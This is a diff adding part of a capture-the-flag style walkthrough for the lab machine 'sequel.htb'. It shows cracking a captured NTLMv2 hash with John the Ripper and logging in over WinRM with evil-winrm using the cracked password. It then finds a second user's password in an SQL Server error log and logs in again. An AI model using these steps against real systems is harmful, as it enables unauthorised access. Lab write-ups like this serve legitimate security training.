@@ -240,4 +240,136 @@ Here's the command
 
 We now have the hash for user sql_svc 
 
+Here's the resource that helped me do this [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
+
 I'll save it in a file and brute force using JTR
+
+```
+└─$ john -w=/home/mark/Documents/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+REGGIE1234ronnie (sql_svc)     
+1g 0:00:00:34 DONE (2023-02-26 19:35) 0.02863g/s 306437p/s 306437c/s 306437C/s REINLY..REDMAN69
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed. 
+```
+
+Lets login to winrm using the cred `sql_svc:REGGIE1234ronnie`
+
+```
+└─$ evil-winrm -u sql_svc -p REGGIE1234ronnie -i sequel.htb
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+*Evil-WinRM* PS C:\Users\sql_svc\Documents> 
+```
+
+Checking the sqldirectory there's a log file in it
+
+```
+*Evil-WinRM* PS C:\> dir
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         2/1/2023   8:15 PM                PerfLogs
+d-r---         2/6/2023  12:08 PM                Program Files
+d-----       11/19/2022   3:51 AM                Program Files (x86)
+d-----       11/19/2022   3:51 AM                Public
+d-----         2/1/2023   1:02 PM                SQLServer
+d-r---         2/1/2023   1:55 PM                Users
+d-----         2/6/2023   7:21 AM                Windows
+
+*Evil-WinRM* PS C:\> net user
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            Brandon.Brown            Guest
+James.Roberts            krbtgt                   Nicole.Thompson
+Ryan.Cooper              sql_svc                  Tom.Henn
+The command completed with one or more errors.
+
+*Evil-WinRM* PS C:\> cd SQLServer
+*Evil-WinRM* PS C:\SQLServer> dir
+
+
+    Directory: C:\SQLServer
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         2/7/2023   8:06 AM                Logs
+d-----       11/18/2022   1:37 PM                SQLEXPR_2019
+-a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe
+-a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe
+
+
+*Evil-WinRM* PS C:\SQLServer> cd Logs
+*Evil-WinRM* PS C:\SQLServer\Logs> dir
+
+
+    Directory: C:\SQLServer\Logs
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK
+
+
+*Evil-WinRM* PS C:\SQLServer\Logs> 
+```
+
+And the size is much so i'll just read the content and filter out `failed` P.S `I already had to download it and analyze it well` 
+
+```
+*Evil-WinRM* PS C:\SQLServer\Logs> Select-String ./ERRORLOG.BAK -Pattern 'failed'
+
+ERRORLOG.BAK:36:2022-11-18 13:43:06.06 Server      Perfmon counters for resource governor pools and groups failed to initialize and are disabled.
+ERRORLOG.BAK:112:2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+ERRORLOG.BAK:114:2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
+
+
+*Evil-WinRM* PS C:\SQLServer\Logs> 
+```
+
+Cool we see another cred `Ryan.Cooper:NuclearMosquito3`
+
+I'll try it over winrm 
+
+```
+└─$ evil-winrm -u Ryan.Cooper -p NuclearMosquito3 -i sequel.htb
+
+Evil-WinRM shell v3.4
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> whoami
+sequel\ryan.cooper
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents>
+```
